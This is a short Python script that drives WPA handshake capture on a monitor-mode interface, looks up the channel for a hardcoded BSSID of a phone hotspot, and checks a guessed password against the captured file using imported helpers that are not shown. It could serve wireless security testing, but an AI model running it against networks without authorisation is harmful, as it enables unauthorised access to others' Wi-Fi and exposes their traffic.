from analyze_pcap import analyze_pcap
from analyze_pcap import check_password_subprocess
from capture_traffic import find_channel_by_bssid
from capture_traffic import capture_handshake

interface="wlan0mon",
bssid = "AA:8E:63:8C:E6:A8"
ssid = "Redmi Note 11"
prefix = "handshake"
password = "viktorialove"

channel = find_channel_by_bssid(interface, bssid)
print()
print("Starting WPA Handshake Capture")
print()
capture_handshake(interface, bssid, ssid, channel, prefix)
cap_file = "handshake-01.cap"
analyze_pcap(cap_file)
check_password_subprocess(cap_file, bssid, password)
